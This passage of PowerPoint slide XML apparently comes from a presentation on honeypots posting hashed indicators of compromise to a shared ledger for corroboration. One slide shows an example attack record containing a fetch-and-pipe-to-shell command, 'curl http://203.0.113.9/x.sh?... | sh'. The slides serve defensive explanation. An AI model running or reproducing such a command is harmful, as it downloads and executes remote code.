            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>How it works, step by step</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="step 1 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="step arrow 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720" y="1682496"/>
            <a:ext cx="868680" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="step 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2057400"/>
            <a:ext cx="1463040" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Observe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A honeypot records an attack.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="step 2 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="1463040"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="step arrow 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2834640" y="1682496"/>
            <a:ext cx="868680" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="step 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="2057400"/>
            <a:ext cx="1463040" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Normalize</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Keep the fields that define “the same” IOC.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="step 3 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3840480" y="1463040"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="step arrow 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="1682496"/>
            <a:ext cx="868680" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="step 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3840480" y="2057400"/>
            <a:ext cx="1463040" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hash</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Turn it into a fingerprint h.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="step 4 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="1463040"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="step arrow 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="1682496"/>
            <a:ext cx="868680" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="step 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="2057400"/>
            <a:ext cx="1463040" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Post</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Write the tag ⟨node ID, h⟩ to the ledger.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="step 5 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="1463040"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="step 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="2057400"/>
            <a:ext cx="1463040" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Count</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>k or more nodes posted h? Corroborated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="no-messages panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3931920"/>
            <a:ext cx="8046720" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="no-messages note"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3931920"/>
            <a:ext cx="7680960" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No node ever talks to another. The ledger is the only thing they share.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Choosing what counts as “the same” IOC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="example record panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="8046720" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="example record"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1371600"/>
            <a:ext cx="7772400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Example record   </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>198.51.100.23   curl http://203.0.113.9/x.sh?id=a3f9c2e1 | sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="17" name="keying table"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1579011935"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="548640" y="2011680"/>
          <a:ext cx="8046720" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1600200"/>
                <a:gridCol w="4069080"/>
                <a:gridCol w="2377440"/>
              </a:tblGrid>
              <a:tr h="475488">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Keying function</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>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What gets hashed</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>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Trade-off</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="475488">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Exact record</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>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The whole record</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
